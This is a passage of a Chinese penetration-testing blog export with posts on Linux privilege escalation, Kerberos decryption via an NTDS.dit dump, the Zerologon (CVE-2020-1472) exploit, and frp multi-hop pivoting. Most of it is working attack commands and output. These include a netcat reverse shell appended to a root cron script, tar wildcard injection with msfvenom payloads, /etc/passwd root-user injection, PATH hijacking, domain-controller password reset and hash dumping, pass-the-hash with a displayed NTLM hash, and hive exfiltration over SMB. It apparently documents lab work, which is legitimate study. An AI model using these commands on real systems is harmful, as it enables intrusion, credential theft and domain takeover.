123456\n$6$G770c2Pp4gpik//c$3m2qme9asqkg5lJ1DNX9YcGitn6Ek7r6IKsWEF8.Z8N8SJctCdbaTxs1Fcvvqzy/QrQ3TOJIA9KzK9Mf8qBVm/\n$ nano /etc/shadow\n$ su root\n```\n\n- 可写/etc/passwd\n  - 用户名:密码:UID:GID:用户信息:家目录:命令/shell\n  - test:X:0:0:root:/root:/bin/bash\n\n```bash\n$ openssl passwd -1 -salt [salt] [password]\n$ openssl passwd -1 -salt new 123\n$ echo \"hello:\\$1\\$new\\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\" >> /etc/passwd     #注意$符需要转义\n```\n\n****\n\n\n\n### #7 定时任务\n\n**1. 定时文件可编辑**\n\n\n```bash\ncat /etc/crontab\ncrontab -l\n\nuser4@polobox:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n*/5  *    * * * root    /home/user4/Desktop/autoscript.sh\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n\necho \"mkfifo /tmp/tfrn; nc 10.11.53.68 8888 0</tmp/tfrn | /bin/sh >/tmp/tfrn 2>&1; rm /tmp/tfrn\" >> /home/user4/Desktop/autoscript.sh\n```\n\n**2. tar 通配符**\n\n```bash\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\t\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\t#这个文件\n\nuser@debian:~$ cat /usr/local/bin/compress.sh\n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\t\t#tar 命令后面跟的是通配符*\n\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=4444 -f elf -o shell.elf\t#生成反向shell\n$ scp shell.elf user@10.10.63.222:/home/user/\t#传输到目标机\n$ chomd +x shell.elf\t\n$ touch /home/user/--checkpoint=1\t#在/home/user目录中创建两个文件\n$ touch /home/user/--checkpoint-action=exec=shell.elf\t#在/home/user目录中创建两个文件\n$ user@debian:~$ ls\t\n--checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  shell.elf  tools\n$ nc -lvp 4444\t#开启监听\n```\n\n**3. crontab-PATH 环境变量**\n\n```bash\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\t#请注意，PATH 变量以 /home/user开头，这是我们用户的主目录\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\n\nuser@debian:~$ nano overwrite.sh\nuser@debian:~$ chmod +x /home/user/overwrite.sh\nuser@debian:~$ cat overwrite.sh \n#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\nuser@debian:~$ /tmp/rootbash -p\t\t\t#等待脚本执行后\nrootbash-4.1# \nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nrm /tmp/rootbash  #请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！\nexit\n```\n\n***\n\n\n\n### #8 NFS\n\n网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。\n\n目标机开启了/tmp共享\n\n```bash\nuser@debian:~$ cat /etc/exports\n```\n\n![image-20220518175200970](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/612199c3359bec53f0b5ada64da87c30.png)\n\n```bash\n$ showmount -e 10.10.109.232\n```\n\n![image-20220519101446347](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dad20bdd1df9f4de5c790886d6dcd056.png)\n\n漏洞利用(攻击机)\n\n```bash\n$ mkdir /tmp/nfs\t\t#创建文件夹\n$ mount -o rw,vers=2 10.10.63.222:/tmp /tmp/nfs\t\t#挂载目录，IP是目标机\n$ msfvenom -p linux/x86/exec CMD=\"/bin/bash -p\" -f elf -o /tmp/nfs/shell.elf\t#生成exploit\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 48 bytes\nFinal size of elf file: 132 bytes\nSaved as: /tmp/nfs/shell.elf\n\n$ chmod +xs /tmp/nfs/shell.elf\t\t#添加执行权限\n```\n\n![image-20220518175454810](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/bb2661aa8b515535055df39a6d9dd51c.png)\n\n目标机\n\n```bash\nuser@debian:/tmp$ ls\nbackup.tar.gz  root.pm  shell  shell2  shell2.c  shell.c  shell.elf  useless\nuser@debian:/tmp$ /tmp/shell.elf\t#执行exploit\nbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nbash-4.1# ls /root\n```\n\n![image-20220518175559457](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/f0cf3e5b659e94bffb96cc96371faece.png)\n\n\n***\n\n\n\n### #9 PATH变量\n\necho $PATH\n\n```bash\nuser5@polobox:~$ ./script    #脚本执行的ls命令\nDesktop  Documents  Downloads  Music  Pictures\tPublic\tscript\tTemplates  Videos\nuser5@polobox:~$ echo \"/bin/bash\" > /tmp/ls      #在/tmp目录下生成一个替换的ls命令\nuser5@polobox:~$ chmod +x /tmp/ls\t\t\t\t#添加执行权限\nuser5@polobox:~$ export PATH=/tmp:$PATH\t\t\t#修改环境变量为/tmp\nuser5@polobox:~$ ./script\t\t\t\t\t\t#执行脚本弹回\nWelcome to Linux Lite 4.4 user5\n \nTuesday 17 May 2022, 05:05:26\nMemory Usage: 364/1991MB (18.28%)\nDisk Usage: 6/217GB (3%)\nSupport - https://www.linuxliteos.com/forums/ (Right click, Open Link)\n \nroot@polobox:~# id\nuid=0(root) gid=0(root) groups=0(root),1004(user5)\n```\n\n***\n\n参考文章：\n\n- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md\n- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md)\n- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation__-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)\n- https://payatu.com/guide-linux-privilege-escalation\n","tags":["提权"]},{"title":"解密Wireshark Kerberos协议","url":"/2022/11/07/解密Wireshark-Kerberos协议/","content":"\n### #1 原始报文\n\n![image-20220908162617609](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png)\n\n\n\n### #2 域控导出NTDS.dit和SYSTEM文件\n\n```bash\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\system.hive\nvssadmin delete shadows /all\n```\n\n![image-20220908162947619](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png)\n\n\n\n### #3 kali安装 libesedb-utils\n\n```\nsudo apt install libesedb-utils\n```\n\n\n\n### #4 git 克隆 ntdsxtract\n\n```bash\ngit clone https://github.com/csababarta/ntdsxtract.git\n```\n\n![image-20220908164711048](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png)\n\n\n\n### #5 python2 安装 pycryptodome\n\n```\npython2 -m pip install pycryptodome\n```\n\n![image-20220908163452363](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png)\n\n\n\n### #6 提取出多个文件，在ntds.dit.export目录下  **(这个步骤等待的时间较长)**\n\n![image-20220908163632883](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png)\n\n![image-20220908164504631](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png)\n\n\n\n### #7 提取出 keytab文件\n\n![image-20220908164816450](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png)\n\n\n\n### #8 Wireshark 导入keytab文件  编辑->首选项->Protocols->KRB5\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png\" alt=\"image-20220908164946014\" style=\"zoom:33%;\" />\n\n\n\n### #9 解密enc-part部分，就能看到 Login session key。\n\n![image-20220908165522558](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png)\n\n","tags":["Kerberos","Wireshark"]},{"title":"CVE-2020-1472 Netlogon权限提升","url":"/2022/11/07/CVE-2020-1472-Netlogon权限提升/","content":"\n### # 0x00 目录\n\n1. 漏洞分析\n2. 漏洞利用条件\n3. 漏洞利用\n\n***\n\n### # 0x01 漏洞分析\n\n攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。\n\n影响版本\n\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\n* Windows Server 2012\n* Windows Server 2012 (Server Core installation)\n* Windows Server 2012 R2\n* Windows Server 2012 R2 (Server Core installation)\n* Windows Server 2016\n* Windows Server 2016 (Server Core installation)\n* Windows Server 2019\n* Windows Server 2019 (Server Core installation)\n* Windows Server, version 1903 (Server Core installation)\n* Windows Server, version 1909 (Server Core installation)\n* Windows Server, version 2004 (Server Core installation)\n\n***\n\n### # 0x02 漏洞利用条件\n\n1. 与域控通讯（在不在域内都行）\n2. 能访问域控MS-NRPC服务，\n\n当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。\n\n要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。\n\n***\n\n### # 0x03 复现工具\n\n漏洞验证工具：[https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py](https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py)\n\n漏洞利用工具：https://github.com/risksense/zerologon/blob/master/set_empty_pw.py\n\n密码重置工具：[https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py](https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py)\n\n### # 0x04 漏洞复现\n\n#### 0). 漏洞验证脚本\n\n获取dc主机名\n\n```\nWindows：nbtstat -A 10.10.10.8\nLinux：nbtscan\n```\n\n\n\n漏洞验证工具：zerologon_tester.py\n\n```\npython3 zerologon_tester.py OWA 10.10.10.8\n```\n\n![image-20220810131156397](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png)\n\n\n\n#### 1).  更改dc密码为空\n\n利用set_empty_pw.py将dc密码设置为空，即`31d6cfe0d16ae931b73c59d7e0c089c0`在利用secretsdump.py读dc的hash\n\n```\npython3 set_empty_pw.py OWA 10.10.10.8  #OWA为域控主机名\nimpacket-secretsdump redteam.red/OWA\\$@10.10.10.8 -no-pass\n```\n\n![image-20220810133549444](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png)\n\n获取到域管理员administrator用户hash：redteam.red\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::\n\n![image-20220810152925651](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png)\n\npth登录\n\n```\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810162528929](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png)\n\n**因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复**。\n\n\n\n#### 2).  还原密码\n\n#### #1 第一种方法\n\n密码还原工具restorepassword.py：https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py\n\n利用plain_password_hex\n\n![image-20220810143125888](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png)\n\n用restorepassword.py将密码还原，还原后利用空口令登录失败\n\n```bash\npython3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567\n```\n\n![image-20220810143023360](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png)\n\n\n\n#### #2 第二种方法\n\n从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码\n\n利用redteam.red/administrator hash登录\n\n```bash\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810153151365](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png)\n\n读取sam、system、security文件\n\n```\nreg save hklm\\sam sam.hive\nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\n```\n\n![image-20220810153451987](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png)\n\n通过SMB share复制回攻击机\n\n```\nC:\\>copy sam.hive \\\\10.10.10.128\\share\\sam.hive\n已复制         1 个文件。\n\nC:\\>copy security.hive \\\\10.10.10.128\\share\\security.hive\n已复制         1 个文件。\n\nC:\\>copy system.hive \\\\10.10.10.128\\share\\system.hive\n已复制         1 个文件。\n\nC:\\>exit\n```\n\n![image-20220810153845364](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png)\n\n或者利用impacket-smbclient链接到smb将文件下载到本地。\n\n```\nimpacket-smbclient redteam.red/administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4\n# use c$\n# ls\n# get sam.hive\n# get security.hive\n# get system.hive\n# exit\n```\n\n![image-20220810154730324](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png)\n\n\n\n利用secretsdump 读取到hash\n\n```\nimpacket-secretsdump -sam sam.hive  -system system.hive  -security security.hive LOCAL\n```\n\n![image-20220810160422687](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png)\n\n利用reinstall_original_pw.py将密码恢复。\n\n```\npython3 reinstall_original_pw.py owa 10.10.10.8 4e4890dbf2da33f3ce4087f5dd6a4dba\n```\n\n![image-20220810160619182](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png)\n","tags":["CVE-2020-1472"]},{"title":"frp之一层网络代理 / 二层网络代理 / 三层网络代理","url":"/2022/11/04/frp之一层网络代理  二层网络代理  三层网络代理/","content":"\n# frp之一层网络代理 / 二层网络代理 / 三层网络代理\n\n\n\n![image-20221103155324246](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png)\n\n\n\n### # 一层网络代理\n\n获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。\n\n1. 使用VPS作为FRP服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 用Windows Server 2012作为客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5]\nremote_port = 1080             # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n3. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n4. 命令前加上proxychains4\n\n```bash\nproxychinas4 ssh root@10.10.10.15\n```\n\n****\n\n\n\n### # 二层网络代理\n\n经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上起一个frp客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在DMZ区的10.10.10.15 Ubuntu上执行\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5]\ntype = tcp\nremote_port = 10808            # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n5. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n6. 命令前加上proxychains4\n\n```bash\nproxychinas4 rdesktop 192.168.30.20\n```\n\n***\n\n\n\n### # 三层网络代理\n\n通过代理访问到核心区的**192.168.60.10域控制器**\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在VPS上的FRP服务端上绑定的IP地址\nbind_port = 7000       # 在VPS上的FRP服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上执行以下命令：\n\n启动frp客户端，将本地端口10808转发到VPS的1080端口。\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# 客户端配置文件frpc.ini的内容如下\n[common]\nserver_addr = 192.168.2.200    # 指向VPS上frp服务端绑定的ip地址\nserver_port = 7000             # 指向VPS上frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在**DMZ区**的10.10.10.15 Ubuntu上执行，启动一个客户端\n\n启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 192.168.30.40       # 本地监听的IP地址\nlocal_port = 10809             # 要转发的本地端口\nremote_port = 10808            # 要转发到的远程端口\n```\n\n5. 在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 192.168.30.40      # 指定frp服务器端ip地址\nbind_port = 7000               # 指定frp服务端绑定端口\n```\n\n6. 在办公区的文件服务器上执行\n\n启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.30.40    # 指向Ubantu服务器上的 frp 服务端IP地址\nserver_port = 7000             # 指向Ubantu服务器上的 frp 服务端端口\n[socks5]\ntype = tcp\nremote_port = 10809            # 代理所用的端口，会被转发到服务器\nplugin = socks5                # 代理类型\n```\n\n7. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n8. 命令前加上proxychains4\n\n```\nproxychinas4 rdesktop 192.168.60.10\n```\n\n \n\n参考：《内网渗透体系建设》\n","tags":["内网","代理","frp"]}]